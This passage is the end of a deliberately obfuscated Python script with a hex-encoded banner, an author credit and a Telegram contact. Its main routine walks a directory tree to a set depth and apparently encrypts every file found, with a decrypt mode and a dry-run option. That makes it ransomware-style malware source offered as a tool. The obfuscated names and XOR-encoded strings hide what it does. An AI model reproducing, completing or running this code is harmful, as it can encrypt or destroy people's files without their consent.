e220208896e28896e28896e29196e2200a20202020202020202020202020202020202020202020208896e28896e28896e29196e2202020208896e28896e28896e29196e220208896e28896e28896e29196e2200a20202020202020202020202020202020202020202020208896e28896e28896e29196e29196e29196e29196e29196e28896e28896e28896e22020208896e28896e28896e29196e29196e20a2020202020202020202020202020202020202020202020208896e28896e28896e28896e28896e28896e28896e28896e28896e22020208896e28896e28896e28896e28896e2200a2020202020202020202020202020202020202020202020202020202020202020202020202020202020200a2020202020202020202020202020202020202020202020202020202020202020202020202020202020200a2020202020202020202020202020202020202020202020202020202020202020202020202020202020200a20209196e29196e29196e29196e29196e29196e220209196e29196e29196e29196e29196e29196e29196e29196e220209196e29196e29196e29196e29196e29196e220209196e29196e29196e29196e29196e2202020209196e29196e29196e29196e29196e20a208896e28896e28896e28896e28896e28896e220208896e28896e28896e28896e28896e28896e28896e28896e220208896e28896e28896e28896e28896e28896e29196e29196e28896e28896e28896e28896e28896e29196e29196e220208896e28896e28896e28896e28896e2200a8896e28896e28896e29196e29196e29196e29196e2208896e28896e28896e29196e2208896e28896e28896e29196e22020209196e29196e29196e28896e28896e28896e29196e2208896e28896e28896e28896e28896e29196e29196e220208896e28896e28896e29196e2200a208896e28896e28896e28896e28896e29196e29196e28896e28896e28896e29196e2208896e28896e28896e29196e220208896e28896e28896e28896e28896e28896e28896e29196e2208896e28896e28896e28896e28896e28896e29196e29196e2208896e28896e28896e29196e2200a20209196e29196e28896e28896e28896e2208896e28896e28896e29196e29196e28896e28896e28896e29196e2208896e28896e28896e29196e29196e28896e28896e28896e220208896e28896e28896e29196e28896e28896e28896e29196e29196e28896e28896e28896e29196e2200a208896e28896e28896e28896e28896e22020208896e28896e28896e28896e28896e28896e28896e29196e220208896e28896e28896e28896e28896e28896e22020208896e28896e28896e29196e2208896e28896e28896e29196e28896e28896e28896e29196e2200a202020202020202020202020208896e28896e28896e29196e29196e2202020202020202020208896e28896e28896e29196e29196e2208896e28896e28896e28896e28896e28896e29196e29196e20a2020202020202020202020208896e28896e28896e28896e28896e2202020202020202020208896e28896e28896e28896e28896e22020208896e28896e28896e28896e28896e28896e2200a'))
    IlllIIlIlIIlllI[(lambda IIIIIIIllllIIIllllIlll: bytes([int.__xor__(int(IIIIIIIllllIIIllllIlll[IIllllIIIlII:IIllllIIIlII + 2], 16), 153) for IIllllIIIlII in range(0, len(IIIIIIIllllIIIllllIlll), 2)]).decode())('e9ebf0f7ed')]((lambda lIIlIlllIIIlIlllIlIlIll: ''.join((chr(int.__xor__(lIIllIIllIlIll, 26)) for lIIllIIllIlIll in lIIlIlllIIIlIlllIlIlIll)))([86, 117, 123, 126, 115, 116, 125, 52, 52, 52]))
    IlllIIlIlIIlllI[(lambda IlIIlIIllIIlIIIllIIIIl: b''.fromhex(IlIIlIIllIIlIIIllIIIIl)[::-1].decode())('746e697270')]((lambda lIIIlllIlIlIlIIlIl: int.__xor__(lIIIlllIlIlIlIIlIl, 24238044242108423210763722685177147861710012111146411).to_bytes(22, 'big').decode())(6233508154726356314596418242259400526019106136810373))
    IlllIIlIlIIlllI[(lambda lIIlIlllIIIlIlllIlIlIll: b''.__class__([IIllllIIIlII ^ 180 for IIllllIIIlII in lIIlIlllIIIlIlllIlIlIll[::-1]]).decode())([192, 218, 221, 198, 196])]((lambda lIIlIlllIIIlIlllIlIlIll: ''.join((chr(int.__xor__(lIIllIIllIlIll, 57)) for lIIllIIllIlIll in lIIlIlllIIIlIlllIlIlIll)))([120, 76, 77, 81, 86, 75, 25, 3, 25, 126, 86, 93, 25, 106, 90, 75, 80, 73, 77]))
    IlllIIlIlIIlllI[(lambda lIIlIlllIIIlIlllIlIlIll: ''.join((chr(int.__xor__(lIIllIIllIlIll, 84)) for lIIllIIllIlIll in lIIlIlllIIIlIlllIlIlIll)))([36, 38, 61, 58, 32])]((lambda lIIlIlllIIIlIlllIlIlIll: ''.join((chr(int.__xor__(lIIllIIllIlIll, 58)) for lIIllIIllIlIll in lIIlIlllIIIlIlllIlIlIll)))([110, 95, 86, 95, 93, 72, 91, 87, 26, 0, 26, 78, 20, 87, 95, 21, 86, 83, 92, 95, 13, 8, 2, 92, 79, 13, 48]))
    if not root.exists():
        return
    if lIIlIIIIIIlIIlIIlIIlll.decrypt:
        lllIllllIllIlllIIIIlIIlllII = IlllllllIllIIIllIIlIlIIlIlI(root, llllIIlllllllllIlllIllllI, lIIlIIIIIIlIIlIIlIIlll.depth)
        if not lllIllllIllIlllIIIIlIIlllII:
            return
        for IIIlIIIlllIIllIIIIlll in lllIllllIllIlllIIIIlIIlllII:
            lIIlIIlIllIIlllllllIlI(IIIlIIIlllIIllIIIIlll)
        return
    IllIIlllIIlIlIIIlIIlIIllll(root, lIIlIIIIIIlIIlIIlIIlll.depth, dry_run=lIIlIIIIIIlIIlIIlIIlll.IllIIIIlIIIIIIIlllIlllIIllI)
    lllIllllIllIlllIIIIlIIlllII = IlllllllIllIIIllIIlIlIIlIlI(root, llllIIlllllllllIlllIllllI, lIIlIIIIIIlIIlIIlIIlll.depth)
    if not lllIllllIllIlllIIIIlIIlllII:
        return
    for IIIlIIIlllIIllIIIIlll in lllIllllIllIlllIIIIlIIlllII:
        IIIllllllllIIlllIlllIl(IIIlIIIlllIIllIIIIlll, dry_run=lIIlIIIIIIlIIlIIlIIlll.IllIIIIlIIIIIIIlllIlllIIllI)
if __name__ == (lambda lIIlIlllIIIlIlllIlIlIll: ''.join((chr(int.__xor__(lIIllIIllIlIll, 37)) for lIIllIIllIlIll in lIIlIlllIIIlIlllIlIlIll)))([122, 122, 72, 68, 76, 75, 122, 122]):
    llllIIIllIlIIlIlllIIl()
